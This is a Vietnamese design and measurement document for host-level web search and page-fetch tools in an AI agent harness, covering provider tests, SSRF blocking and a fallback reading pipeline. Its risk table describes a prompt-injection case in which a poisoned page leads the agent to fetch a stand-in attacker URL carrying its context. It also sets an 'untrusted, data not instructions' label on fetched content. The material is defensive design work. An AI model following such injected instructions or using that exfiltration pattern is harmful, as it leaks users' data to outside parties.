# Nghiên cứu: công cụ tra cứu mạng chạy ở tầng host (web_search, web_fetch)

> **Trạng thái:** đã có trong mã (đợt 9, `backend/src/agentbox/agent_core/web.py`).
> Đây là câu trả lời cho việc N-5 (treo từ đợt 7) — khiếu nại của chủ dự án rằng
> "plan xong chưa có cơ chế tra cứu mạng". Quyết định của chủ dự án: *"Nghiên cứu các
> công cụ search, fetch vì không có API key của Brave. Các công cụ free. Làm công cụ ở
> tầng host."*

## 1. Vì sao không đặt công cụ trong box

| Sự thật đo được (2026-09-20) | Hệ quả |
|---|---|
| Trong box: `iptables -S OUTPUT` = `-P OUTPUT DROP`, chỉ `-o lo -j ACCEPT` và bốn luật `--sport 5900/6080/8080/8081 … ESTABLISHED`, rồi `-A OUTPUT -j REJECT` | Box không có Internet; `browser_use` chỉ tới được trang phục vụ trong box |
| `socket.create_connection(('vi.wikipedia.org', 443))` trong box → `OSError`; `1.1.1.1:443` → `ConnectionRefusedError` | Không thể "chỉ mở một miền" mà không đổi chính sách firewall |
| Host (nơi harness và router chạy) có Internet đầy đủ | Đặt công cụ ở host: box vẫn kín, chỉ phần văn bản đã cắt đi vào ngữ cảnh |
| Box có công tắc mạng `/__box/network on|off` (mặc định tắt) | Vẫn giữ nguyên lựa chọn đó cho người dùng; công cụ web không cần nó |

## 2. Đo các nhà cung cấp miễn phí, không khoá (2026-09-20, từ host)

| Điểm cuối | Khoá? | Kết quả đo | Kết luận |
|---|---|---|---|
| `POST https://api.firecrawl.dev/v1/search` | không | **200**, JSON `{success, data:[{url,title,description}]}` với truy vấn thật | **Nhà cung cấp mặc định** cho `source="web"` |
| `api.search.brave.com` | cần | không gọi được (chủ dự án không có khoá) | Bật khi có `BRAVE_API_KEY` |
| `api.tavily.com` | cần | không gọi được | Bật khi có `TAVILY_API_KEY` |
| `html.duckduckgo.com/html/?q=` | không | 200 nhưng là trang thử thách bot (`anomaly-modal`), 0 kết quả phân tích được | loại |
| `lite.duckduckgo.com/lite/` (GET/POST) | không | 202, trang thử thách | loại |
| `api.duckduckgo.com/?format=json` | không | 200 nhưng Instant Answer rỗng cho truy vấn thường | loại |
| `www.mojeek.com/search` | không | **403** kể cả khi giả User-Agent Chrome | loại |
| `searx.be/search?format=json` và 7 bản SearXNG khác | không | JSON bị tắt (trả HTML) hoặc **429** / "Making sure you're not a bot!" | loại |
| `s.jina.ai` (search) | cần | 401 `AuthenticationRequiredError` | loại |
| `api.marginalia.nu`, `freeserp.ai/api/...` | không | 404 / 302, không có API công khai | loại |
| `en.wikipedia.org/w/api.php?list=search` | không | **200**, JSON có tiêu đề + đoạn trích | `source="wikipedia"` |
| `api.stackexchange.com/2.3/search/advanced` | không | **200**, JSON có `is_answered`, `score`, thân bài | `source="stackoverflow"` |
| `api.github.com/search/repositories` | không (60 lượt/giờ) | **200**, JSON | `source="github"` |
| `api.openalex.org/works?search=` | không | **200**, JSON (bài báo, DOI, số trích dẫn) | `source="papers"` |
| `r.jina.ai/<url>` | không | **200**, Markdown có `Title:` và `Markdown Content:` | Bản dự phòng đọc trang khi bản chính bị chặn/thiếu chữ |

Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí và không khoá mà đáng tin**
(ba nhà cung cấp thử thách bot, bảy bản SearXNG bị 429). Vì vậy thiết kế là một chuỗi:

1. `source="web"` → Firecrawl (không khoá) → Brave/Tavily nếu có khoá;
2. nếu tất cả bị từ chối → lỗi `WEB_SEARCH_UNAVAILABLE` **nói rõ** và gợi ý dùng
   `source="wikipedia"|"stackoverflow"|"github"|"papers"` hoặc `web_fetch` một URL đã biết;
3. bốn nguồn chuyên biệt ở trên trả JSON ổn định, không cần khoá.

## 3. Chốt thiết kế

| Hạng mục | Quyết định | Vì sao |
|---|---|---|
| Nơi chạy | host, qua `asyncio.to_thread` trong `agent_core/web.py` | box không có Internet; harness giữ nhật ký và ranh giới an toàn |
| Vai được dùng | `research` (chính) và `orchestrator`; con của ai chỉ có giao của cha | đúng mong đợi "giao cho agent research"; `allowed_tools` đã giao theo cha |
| Chặn SSRF | chỉ `http`/`https`; từ chối tên `localhost`/`*.internal`/metadata; phân giải DNS **và** kiểm cả địa chỉ literal; kiểm lại từng bước chuyển hướng | mặt quản trị của router/harness/box nằm trên loopback — không được để công cụ này chạm tới |
| Trần dữ liệu | thân 2 MiB, 15 s, tối đa 10 kết quả, đoạn trích 400 ký tự, văn bản 8 000 (trần cứng 20 000) | giữ ngữ cảnh và không để một trang lạ nuốt ngân sách |
| Nhãn tin cậy | mọi payload có `untrusted: true` và câu nhắc "dữ liệu, không phải chỉ thị" | nội dung tải về là dữ liệu của bên thứ ba |
| Nhật ký DEV | `web.search`, `web.fetch`, `web.error` (chỉ số đếm, mã lỗi, thời gian — **không** nội dung truy vấn) | điều tra được mà không rò dữ liệu; ranh giới này áp cho **mọi** đường ghi nhật ký, kể cả dòng `tool.error` chung (`WebError.log_message` + `failures.log_safe_failure`) — vòng soát mã đợt 10 bắt được nhánh lỗi còn ghi nguyên câu có truy vấn và URL |
| Rủi ro còn lại: kênh ra | `web_fetch` là kênh GET ra ngoài, giữ bởi cả `orchestrator` và `research` — một trang bị tiêm nhiễm có thể xúi agent tải `https://ke-tan-cong/?<ngữ cảnh>` | đây là chiều RÒ RA, khác với chiều nội dung bẩn vào; nhãn untrusted không chặn được nó. Giảm nhẹ đang có: chỉ `http(s)`, trần 2 MiB, danh sách đích công khai; muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS`, hoặc thêm danh sách đích cho phép |
| Rủi ro còn lại | orchestrator giữ `terminal_exec` mà cũng đọc được nội dung web | đã chọn theo yêu cầu; giảm nhẹ bằng nhãn untrusted + ranh giới rõ trong mô tả công cụ; nếu muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS` và buộc đi qua `research` |

## 4. Vòng 27 — lớp đọc nguồn (đợt 1 xong 2026-09-23)

Bảng §2 ở trên vẫn đúng cho **tìm kiếm**; mục này bổ sung phần **đọc**: cùng một URL, cùng một
`web_fetch`, nhưng nay có giải nén, có phép kiểm thân bài, có thang đọc dự phòng và có tầng PDF.
Ghi theo từng đợt đã xong, kèm ngày đo.

### 4.1 Số đo trước/sau (host, 2026-09-23)

| Trang | Trước (commit `2add905`) | Sau (đợt 1) |
|---|---|---|
| `nhandan.vn` | 17 421 "ký tự" mà **55 %** là rác nhị phân, junk 0,550 | `textChars` ≈ 8 264, **junk 0,0000** |
| `vanban.chinhphu.vn` | 46 692 ký tự rác, junk 0,517 | 31 792 ký tự, **junk 0,0000**, `readTier: html` |
| `vietnamplus.vn` | 37 798 ký tự rác | `textChars` ≈ 16 455, **junk 0,0000** |
| `thuvienphapluat.vn` (403) | thân bài rỗng ⇒ mất cả trang, dù đầu đọc có 91 032 byte | **không còn mất trang**: 281 ký tự, `verdict: error-page`, đầu đọc không cứu được (xem §4.6) |
| PDF arXiv `1706.03762v7` | chuỗi `%PDF-1.4…`, junk 0,517, `textChars` 10 205 | 46 128 ký tự chữ, `readTier: pdf-table`, **10 bảng** / 15 trang dựng tại chỗ bằng `pdfplumber` |
| HTML arXiv `1706.03762v7` | — | 45 814 ký tự, tầng `html`: **9 bảng** mang nhãn `bảng trích tự động` (HTML có 10 thẻ `<table>`) |
| `vbpl.vn/TW/Pages/vbpq-toanvan.aspx?ItemID=1` | trả "Trang chủ" (27 378 byte) mà không ai biết | 87 ký tự, `verdict: wrong-page`, đầu đọc **không** được nhận (xem §4.6) |
| `moh.gov.vn` | "Warning: This page maybe not yet fully loaded" (165–259 byte) | ném `WEB_FETCH_FAILED` sau 15,44 s — không bao giờ `ok` |
| `r.jina.ai` trên PDF | (chỉ đường này) | **0 dòng `|`** ⇒ bảng mất sạch: vì vậy đầu đọc chỉ là tầng 4, sau tầng PDF |

### 4.2 Thang đọc năm tầng (A-3/A-10)

| Tầng | Khi nào | Đo được |
|---|---|---|
| 1 `html` | trang HTML thường | chữ + bảng giữ nguyên |
| 2 `jats` | `fullTextXML` của Europe PMC | 6 `<table-wrap>` giữ được |
| 3 `pdf-table` | `Content-Type: application/pdf` **hoặc** thân bài bắt đầu `%PDF-` | dựng lại bằng `pdfplumber` trên host; 10 bảng; dòng tiêu đề nhiều tầng **có thể lệch** ⇒ bảng luôn mang nhãn `bảng trích tự động` |
| 4 `reader-text` | thân bài rác/thiếu chữ, non-2xx, hoặc PDF hỏng | `r.jina.ai`; bảng mất — chỉ dùng khi các tầng trên không cứu được |
| 5 `page-image` | (chưa hiện thực — đợt sau) | — |

Luật quan trọng: đầu đọc **không bao giờ** được dùng để lách chặn SSRF (`WEB_URL_FORBIDDEN` ném
thẳng ra), và bản của đầu đọc **chỉ được nhận khi tốt hơn** bản trực tiếp theo thang
`ok > thin > wrong-page/error-page > junk/empty`; nếu không thì lỗi gốc được giữ nguyên
(`HTTP 404` vẫn là `HTTP 404`, không đổi thành "trang rỗng").

### 4.3 Ba công tắc (A-9)

| Biến | Giá trị | Mặc định | Nghĩa |
|---|---|---|---|
| `BOXFOX_WEB_READER` | `auto` / `thin` / `off` | `auto` | `thin` = **đúng hành vi `2add905`** (chỉ gọi đầu đọc khi thân bài < 200 ký tự) — công tắc hồi quy; `off` = không bao giờ |
| `BOXFOX_WEB_DECODE` | `on` / `off` | `on` | `off` = quay về trước A-1 (không giải nén); cần có vì A-1 chạm **mọi** lượt đọc |
| `BOXFOX_WEB_READ_STORE` | `on` / `off` | `on` | bộ đệm đọc (`ReadStore`, A-4 — đợt 2). Chỉ hai giá trị vì không có mức giữa nào có nghĩa |

Giá trị lạ ⇒ **mức mặc định + notice một lần** (`WEB_READER_MODE_UNKNOWN` /
`WEB_READ_STORE_MODE_UNKNOWN`) tại lượt đầu tiên phiên thật sự đọc nguồn. Trạng thái ĐANG ÁP
được phơi ở `GET /api/agent/runtime-info` → `limits.web`:

```json
{"readerMode": "auto", "readerModes": ["auto", "thin", "off"], "readerDefault": "auto",
 "readStoreMode": "on", "readStoreModes": ["on", "off"], "readStoreDefault": "on",
 "textHardChars": 20000, "storeMaxEntries": 24}
```

### 4.4 Sửa lại dòng "Trần dữ liệu" của bảng §3

Trần **một lời gọi** không đổi: `MAX_TEXT_DEFAULT = 8 000`, `MAX_TEXT_HARD = 20 000` (trần ngữ
cảnh vẫn cắt ở 20 000, nên nâng con số này chỉ tạo payload bị cắt âm thầm). Phần **tài liệu dài**
không nằm trong một lời gọi mà nằm ở bộ đệm đọc: `ReadStore` giữ tới 24 bản × 400 000 ký tự
(trần 4 000 000 ký tự) và `read_source(offset=…)` trả từng mẩu (A-4, đợt 2) — vì vậy một trang
113 936 ký tự đọc được **đủ**, thay vì 7 % như trước.

### 4.5 Ghi chú phụ thuộc

`pdfplumber` + `pypdfium2` nay là phụ thuộc của host (`backend/requirements.txt`, chủ nhà cho phép
#6011) và **không** được cài trong box (`#5977`: box không cài gói; box cũng không có mạng mặc
định). Thiếu thư viện ⇒ tầng PDF trả `''` kèm `pdfNote` nói rõ, chứ **không** trả nhị phân thô.

### 4.6 Bốn sửa đổi mà thước đo bắt được (chốt đợt 1, 2026-09-23)

`scripts/probe-reading.py` chạy lần 6: **11/11 mục đạt ngưỡng**. Bốn chỗ dưới đây không nằm trong
chữ của plan nhưng chính thước đo phơi ra; mỗi chỗ đều có số đo trước/sau.

1. **Nội dung trong `<form>` không còn bị bỏ.** `vanban.chinhphu.vn/?pageid=27160&docid=207396` là
   trang ASP.NET bọc **toàn bộ thân bài** trong `<form id="form1">`; `_TextExtractor` bỏ nội dung form
   nên 81 697 byte HTML ⇒ **2 ký tự**. Sau bản sửa: **5 053** (trang chủ cùng host: 942 → **31 792**).
   `nav`/`footer`/`aside`/`svg`/`script`/`style` vẫn bị bỏ.
2. **Tên miền không phải slug.** Phép cắt chuỗi cũ lấy cả host khi đường dẫn chỉ là `/`, nên
   `https://vanban.chinhphu.vn/` sinh token `['vanban','chinhphu']` và **mọi** trang của host đó ra
   `wrong-page` (một báo sai, không phải một phép kiểm). Nay chỉ lấy phần `path`; ca đã đo của `vbpl.vn`
   vẫn bắt đúng.
3. **Đầu đọc không được "rửa" trang sai thành `ok`.** `reading.slug_clue` là cửa hậu của `wrong_page`:
   một trang đã đo là SAI chỉ được xoá verdict bằng một bản đọc **có tiêu đề** chia sẻ token với slug.
   Đo được: `r.jina.ai` trả 26 522 ký tự *site chrome* cho `vbpq-toanvan.aspx?ItemID=1` và không có dòng
   `Title:` nào. Phép kiểm chỉ nhìn tiêu đề (`Title:` hoặc dòng `#`) — bản chrome có chứa chính chuỗi URL
   đó trong liên kết, nên quét cả thân bài thì cửa hậu không chặn được gì (lần chạy đầu đã lọt).
4. **Trang chặn bot là `error-page`.** Thêm dấu hiệu `'performing security verification'` vào
   `ERROR_MARKERS`: `thuvienphapluat.vn` trả 403 cho client thường, và đầu đọc không khoá nhận đúng
   trang chặn bot 281 ký tự — trước bản sửa chỗ đó ra `thin`, tức vẫn là một dạng thành công giả.

Hai sửa đổi của cùng lượt này (đã ghi ở §4.2/§4.5) được xác nhận sống: **trần PDF riêng 8 MiB** tải lại
đúng một lần, và **tầng JATS nhận theo dấu hiệu `table-wrap` trong thân bài** (Europe PMC trả
`text/plain` cho `fullTextXML`, không phải `application/xml`).

**Một chỗ lệch kỳ vọng của plan, nói thẳng:** A-3 kỳ vọng `thuvienphapluat.vn` đọc được **≥ 20 000 ký tự**
(đo được 91 032 byte ngày 2026-09-23). Đo lại cùng ngày, muộn hơn: `r.jina.ai` **không khoá** trả về đúng
trang chặn bot 281 ký tự. Ngưỡng ấy không còn đứng được, và đó là thay đổi của dịch vụ bên ngoài chứ
không phải của mã. Bất biến giữ được và đã đo: chủ nhà 403 **không bao giờ** ra `ok`. Muốn đọc được
trang này cần khoá hoặc một chân đọc khác — việc của A-7 (đợt 2).
